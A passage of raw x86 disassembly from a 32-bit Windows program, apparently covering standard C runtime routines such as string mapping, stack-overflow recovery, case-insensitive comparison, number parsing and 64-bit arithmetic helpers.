  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
